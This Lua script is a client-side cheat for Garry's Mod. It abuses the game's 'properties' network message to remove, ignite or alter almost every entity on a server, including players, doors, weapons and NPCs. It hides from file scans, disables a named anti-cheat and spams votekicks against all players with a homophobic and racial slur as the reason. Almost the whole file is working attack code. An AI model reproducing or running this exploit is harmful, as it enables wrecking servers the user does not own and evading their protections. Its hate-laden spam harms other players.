-- paradox note: Apr 16th, 2013

local ADADADAD = file
local AAAAAAAA = concommand
local BADADADA = net

oldnetReceive = net.Receive

function net.Receive( msgname, len )
	print(msgname)
	print(len)
	if net.ReadString then print(net.ReadString()) end
	if net.ReadLong then print(net.ReadLong()) end
	
	oldnetReceive( msgname, len )
end	

oADADADADRead = ADADADAD.Read
function ADADADAD.Read(contents, type)
	if not contents then return nil end
	if string.find(string.lower(contents), "exploitsystem") then return nil end
	
	return oADADADADRead(contents, type)
end


AAAAAAAA.Add("sce_removetrace", function()
	BADADADA.Start("properties")
	BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
	BADADADA.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	BADADADA.SendToServer()
end)

AAAAAAAA.Add("sce_colliON", function()
	BADADADA.Start("properties")
	BADADADA.WriteUInt( util.NetworkStringToID( "collision_on" ), 32 )
	BADADADA.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	BADADADA.SendToServer()
end)

AAAAAAAA.Add("sce_removemost", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics"
		//or string.find(tostring(v), "Player")
		or string.find(tostring(v), "Weapon")
		or string.find(tostring(v), "prop_door")
		or string.find(tostring(v), "func_move")
		or string.find(tostring(v), "prop_vehicle")
		or string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removenpc", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removegmod", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(tostring(v), "gmod")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removeall", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics"
		or string.find(tostring(v), "Player")
		or string.find(tostring(v), "Weapon")
		or string.find(tostring(v), "prop_door")
		or string.find(tostring(v), "func_move")
		or string.find(tostring(v), "prop_vehicle")
		or string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_remove", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics" and not v.ImOwner then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removeweapons", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(string.lower(v:GetClass()), "weapon") then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)


AAAAAAAA.Add("sce_ignite", function()
	for k,v in pairs(ents.GetAll()) do
		//if v:GetClass() == "prop_physics" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "ignite" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		//end
	end
end)

AAAAAAAA.Add("sce_gravity", function()
	for k,v in pairs(ents.GetAll()) do
		--if v:GetClass() == "prop_physics" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "gravity" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		--end
	end
end)

AAAAAAAA.Add("sce_flood_removewater", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "func_water_analog" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_collisions", function()
	for k,v in pairs(ents.GetAll()) do
		BADADADA.Start("properties")
			BADADADA.WriteUInt( util.NetworkStringToID( "collision_off" ), 32 )
			BADADADA.WriteEntity( v )
		BADADADA.SendToServer()
	end
end)

AAAAAAAA.Add("sce_getents", function()
	PrintTable(ents.GetAll())
end)
AAAAAAAA.Add("sce_gettrace", function()
	print(LocalPlayer():GetEyeTrace().Entity:GetClass())
end)
AAAAAAAA.Add("sce_removedoors", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "func_door" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)


local votekicking = false
AAAAAAAA.Add("sce_spamvotekick", function(pl,cmd,arg)
	if votekicking then
		timer.Remove("fds")
		votekicking = false
	else
		if arg[1] then
			if arg[2] then
				local target = FindPlayer(arg[2])
				
				timer.Create("fds", tonumber(arg[1]), 0, function()
					RunConsoleCommand("ulx","votekick",target:Nick(),"gay nigger")
				end)
			else
				timer.Create("fds", tonumber(arg[1]), 0, function()
					for i=1,#player.GetAll() do
						if player.GetAll()[i] != LocalPlayer() then
							RunConsoleCommand("ulx","votekick",player.GetAll()[i]:Nick(), "gay nigger")
						end
					end
				end)
			end
		else
			timer.Create("fds", 0.001, 0, function()
				for i=1,#player.GetAll() do
					if player.GetAll()[i] != LocalPlayer() then
						RunConsoleCommand("ulx","votekick",player.GetAll()[i]:Nick(), "gay nigger")
					end
				end
			end)
		end

		votekicking = true
	end
end)

local spamremovemost = false
AAAAAAAA.Add("sce_spamremovemost", function(pl)
	if spamremovemost then
		timer.Remove("sce_spamremovemost")
		spamremovemost = false
	else
		timer.Create("sce_spamremovemost", 0.5, 0, function()
			RunConsoleCommand("sce_removemost")
		end)
		spamremovemost = true
	end
end)

local spamremovenpc = false
AAAAAAAA.Add("sce_spamremovenpc", function(pl)
	if spamremovenpc then
		timer.Remove("sce_spamremovenpc")
		spamremovenpc = false
	else
		timer.Create("sce_spamremovenpc", 0.5, 0, function()
			RunConsoleCommand("sce_removenpc")
		end)
		spamremovenpc = true
	end
end)

local spamremovegmod = false
AAAAAAAA.Add("sce_spamremovegmod", function(pl)
	if spamremovegmod then
		timer.Remove("sce_spamremovegmod")
		spamremovegmod = false
	else
		timer.Create("sce_spamremovegmod", 0.5, 0, function()
			RunConsoleCommand("sce_removegmod")
		end)
		spamremovegmod = true
	end
end)

local spamremove = false
AAAAAAAA.Add("sce_spamremove", function(pl)
	if spamremove then
		hook.Remove("OnEntityCreated", "lolaids")
		spamremove = false
	else
		hook.Add("OnEntityCreated", "lolaids", function( ent )
			RunConsoleCommand("sce_remove")
		end)
		spamremove = true
	end
end)

local spamremovelp = false
AAAAAAAA.Add("sce_spamremoveLP", function(pl)
	if spamremovelp then
		hook.Remove("OnEntityCreated", "lolaidslp")
		spamremovelp = false
	else
		hook.Add("OnEntityCreated", "lolaidslp", function( ent )
			if LocalPlayer():GetEyeTrace().Entity == ent then ent.ImOwner = true end
			RunConsoleCommand("sce_remove")
		end)
		spamremovelp = true
	end
end)



AAAAAAAA.Add("sce_tac_check", function(pl)
	if RunCheck then
		print("LOL yeah")
	else
		print("nope. gah!!")
	end
end)

AAAAAAAA.Add("sce_tac_remove", function(pl)
	if RunCheck then
		function RunCheck()
			pl:ChatPrint("You would have been kicked. Your welcome.")
		end
		pl:ChatPrint("Tyler's Anti Cheat. The shitty one. Has been patched. LOL!!!")
	end
end)

AAAAAAAA.Add("gethooks", function()
	PrintTable(hook.GetTable())
end)